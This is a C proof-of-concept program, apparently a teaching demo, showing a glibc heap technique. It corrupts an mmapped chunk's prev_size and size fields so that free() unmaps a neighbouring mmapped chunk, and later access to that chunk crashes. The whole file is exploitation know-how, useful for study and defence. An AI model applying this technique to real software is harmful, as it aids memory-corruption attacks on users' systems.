#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#define IS_MMAPPED 0x2

typedef size_t INTERNAL_SIZE_T;

struct malloc_chunk {
    INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
    INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

    struct malloc_chunk* fd;         /* double links -- used only if free. */
    struct malloc_chunk* bk;

    /* Only used for large blocks: pointer to next larger size.  */
    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
    struct malloc_chunk* bk_nextsize;
};

typedef struct malloc_chunk* mchunkptr;
int main() {
    malloc(1);

    void *mm1 = malloc(130*1024*1024 - 3*sizeof(size_t));
    void *mm2 = malloc(130*1024*1024 - 3*sizeof(size_t));

    mchunkptr p1 = (mchunkptr)((char*)mm1 - offsetof(struct malloc_chunk, fd));
    printf("allocated mmapped chunk p1: %p\n", (void*)p1);
    printf("\tp1->prev_size = 0x%zx, p1->size = 0x%zx\n", p1->prev_size, p1->size);

    mchunkptr p2 = (mchunkptr)((char*)mm2 - offsetof(struct malloc_chunk, fd));
    printf("allocated mmapped chunk p2: %p\n", (void*)p2);
    printf("\tp2->prev_size = 0x%zx, p2->size = 0x%zx\n", p2->prev_size, p2->size);

    // note that we need no addresses here
    printf("emulating corruption of p1->prev_size to make a free of p1 actually unmap p2 instead\n");
    p1->prev_size = p2->size & ~7;
    p1->size = 2;
    free(mm1);

    printf("accessing the memory pointed by p1 is fine: p1->size = 0x%zu\n", p1->size);
    printf("accessing the memory pointed by p2 results in a crash:\n");
    printf("p2->size = 0x%zu\n", p2->size);

    return 0;
}
